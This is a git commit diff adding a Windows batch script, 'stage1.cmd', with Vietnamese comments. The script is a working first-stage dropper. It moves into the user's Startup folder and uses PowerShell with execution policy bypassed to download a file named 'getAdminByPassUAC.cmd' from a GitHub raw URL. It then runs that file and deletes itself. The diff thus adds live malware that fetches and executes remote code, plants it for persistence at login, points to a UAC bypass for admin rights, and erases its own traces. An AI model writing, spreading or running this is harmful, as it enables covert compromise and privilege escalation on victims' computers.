213d8c937a176b835553b210cb7543f43cdfb1bb
Thông Tấn <ttthong315@gmail.com>
2025-05-08 00:14:36 +0700

    add stage1.cmd

--- stage1.cmd
+++ stage1.cmd
@@ -1,10 +1,17 @@
 @echo off
 set "HERE=%cd%"
-cd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/bruning-frighting/Windows-Internal/main/getAdminByPassUAC.cmd' -OutFile 'getAdminByPassUAC.cmd'"
+:: Chuyển đến thư mục Startup
+cd /d "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
+:: Tải tệp PowerShell và thực thi
+powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/bruning-frighting/Windows-Internal/main/getAdminByPassUAC.cmd' -OutFile 'getAdminByPassUAC.cmd'"
+
+:: Chạy tệp vừa tải
 .\getAdminByPassUAC.cmd
 
-cd "%HERE%"
+:: Quay lại thư mục cũ
+cd /d "%HERE%"
+
+:: Xóa chính script .bat sau khi thực thi
 del "%~f0"
